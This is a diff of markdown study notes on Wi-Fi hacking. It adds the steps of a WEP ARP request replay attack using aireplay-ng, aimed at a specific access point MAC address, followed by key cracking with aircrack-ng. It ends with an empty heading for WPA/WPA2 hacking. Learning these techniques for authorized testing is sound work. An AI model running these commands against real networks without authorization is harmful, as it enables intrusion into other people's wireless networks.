@@ -42,5 +42,28 @@ airodump-ng --bssid 98:A9:42:27:A2:CA --channel 2 --write arp_replay wlan0mon
 aireplay-ng --fakeauth 0 -a 98:A9:42:27:A2:CA -h 11:22:33:44:55:66 wlan0mon
 ```
 
-3. forcing the AP to generate new IVs (ARP Request Replay).
+3. forcing the AP to generate new IVs (ARP Request Replay). This is done by:
+
+* wait for an arp packet.
+* capture it, and replay it (retransmit it).
+* this causes the AP to produce another packet with a new IV.
+* keep doing this till you have enough IVs to crack the key.
+
+4. To carry out the attack, after following steps 1 and 2 for the busy wep networks, then;
+
+`-b` denotes the target mac addr, `--arpreplay` for an arp replay attack.
+
+```
+aireplay-ng --arpreplay -b 98:A9:42:27:A2:CA -h 11:22:33:44:55:66 wlan0mon
+```
+
+Just wait for some time, then after receiving enough  packets in the `#Data` column, you can now run `aircrack-ng` to crack password. Allow the `airodump-ng` utility to continue running while running the `aircrack-ng` utility.
+
+
+
+### wpa / wpa2 hacking.
+
+
+
+
 
